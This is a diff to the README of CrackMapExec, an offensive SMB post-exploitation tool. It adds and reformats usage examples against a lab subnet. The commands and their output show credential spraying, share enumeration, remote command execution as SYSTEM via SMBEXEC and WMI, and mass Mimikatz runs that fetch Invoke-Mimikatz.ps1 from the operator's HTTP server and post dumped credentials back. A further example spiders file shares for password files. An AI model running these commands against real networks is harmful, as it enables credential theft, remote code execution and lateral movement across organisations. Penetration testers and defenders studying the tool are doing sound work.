@@ -129,17 +129,31 @@ There's been an awakening... have you felt it?
 The most basic usage: scans the subnet using 100 concurrent threads:
 ```
 #~ python crackmapexec.py -t 100 172.16.206.0/24
-[+] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
-[+] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
-[+] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
+[*] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
+[*] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
+[*] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
+```
+
+Quick credential validation:
+```
+#~ python crackmapexec.py -t 100 172.16.206.0/24 -u username -p password
+[*] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
+[*] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
+[*] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
+[+] 172.16.206.132:445 Login successful 'DRUGCOMPANY-PC\username:password'
+[+] 172.16.206.133:445 Login successful 'DRUGOUTCOVE-PC\username:password'
+[+] 172.16.206.130:445 Login successful 'DESKTOP-QDVNP6B\username:password'
 ```
 
 Let's enumerate available shares:
 ```
 #~  python crackmapexec.py -t 100 172.16.206.0/24 -u username -p password --shares
-[+] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
-[+] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
-[+] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
+[*] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
+[*] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
+[*] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
+[+] 172.16.206.132:445 Login successful 'DRUGCOMPANY-PC\username:password'
+[+] 172.16.206.133:445 Login successful 'DRUGOUTCOVE-PC\username:password'
+[+] 172.16.206.130:445 Login successful 'DESKTOP-QDVNP6B\username:password'
 [+] 172.16.206.130:445 DESKTOP-QDVNP6B Available shares:
 	SHARE			Permissions
 	-----			-----------
@@ -166,15 +180,18 @@ Let's execute some commands on all systems concurrently:
 
 ```
 #~ python crackmapexec.py -t 100 172.16.206.0/24 -u username -p password -x whoami
-[+] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
-[+] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
+[*] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
+[*] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
+[+] 172.16.206.132:445 Login successful 'DRUGCOMPANY-PC\username:password'
+[+] 172.16.206.133:445 Login successful 'DRUGOUTCOVE-PC\username:password'
+[+] 172.16.206.130:445 Login successful 'DESKTOP-QDVNP6B\username:password'
 [+] 172.16.206.132:445 DRUGCOMPANY-PC Executed specified command via SMBEXEC
 nt authority\system
 
 [+] 172.16.206.130:445 DESKTOP-QDVNP6B Executed specified command via SMBEXEC
 nt authority\system
 
-[+] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
+[*] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
 [+] 172.16.206.133:445 DRUGOUTCOVE-PC Executed specified command via SMBEXEC
 nt authority\system
 ```
@@ -182,9 +199,12 @@ nt authority\system
 Same as above only using WMI as the code execution method:
 ```
 #~ python crackmapexec.py -t 100 172.16.206.0/24 -u username -p password --execm wmi -x whoami
-[+] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
-[+] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
-[+] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
+[*] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
+[*] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
+[*] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
+[+] 172.16.206.132:445 Login successful 'DRUGCOMPANY-PC\username:password'
+[+] 172.16.206.133:445 Login successful 'DRUGOUTCOVE-PC\username:password'
+[+] 172.16.206.130:445 Login successful 'DESKTOP-QDVNP6B\username:password'
 [+] 172.16.206.132:445 DRUGCOMPANY-PC Executed specified command via WMI
 drugcompany-pc\administrator
 
@@ -201,9 +221,13 @@ Mimikatz's output then gets POST'ed back to our HTTP server, saved to a log file
 #~ python crackmapexec.py -t 100 172.16.206.0/24 -u username -p password --mimikatz
 [*] Press CTRL-C at any time to exit
 [*] Note: This might take some time on large networks! Go grab a redbull!
-[+] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
-[+] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
-[+] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
+
+[*] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
+[*] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
+[*] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
+[+] 172.16.206.132:445 Login successful 'DRUGCOMPANY-PC\username:password'
+[+] 172.16.206.133:445 Login successful 'DRUGOUTCOVE-PC\username:password'
+[+] 172.16.206.130:445 Login successful 'DESKTOP-QDVNP6B\username:password'
 172.16.206.130 - - [19/Aug/2015 18:57:40] "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
 172.16.206.133 - - [19/Aug/2015 18:57:40] "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
 172.16.206.132 - - [19/Aug/2015 18:57:41] "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
@@ -221,10 +245,13 @@ Mimikatz's output then gets POST'ed back to our HTTP server, saved to a log file
 Lets Spider the C$ share starting from the ```Users``` folder for the pattern ```password``` in all files and directories (concurrently):
 ```
 #~ python crackmapexec.py -t 150 172.16.206.0/24 -u username -p password --spider Users --depth 10 --pattern password
-[+] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
-[+] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
+[*] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
+[*] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
+[+] 172.16.206.132:445 Login successful 'DRUGCOMPANY-PC\username:password'
+[+] 172.16.206.133:445 Login successful 'DRUGOUTCOVE-PC\username:password'
 [+] 172.16.206.132:445 DRUGCOMPANY-PC Started spidering
-[+] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
+[*] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
+[+] 172.16.206.130:445 Login successful 'DESKTOP-QDVNP6B\username:password'
 [+] 172.16.206.133:445 DRUGOUTCOVE-PC Started spidering
 [+] 172.16.206.130:445 DESKTOP-QDVNP6B Started spidering
 //172.16.206.132/Users/drugcompany/AppData/Roaming/Microsoft/Windows/Recent/supersecrepasswords.lnk
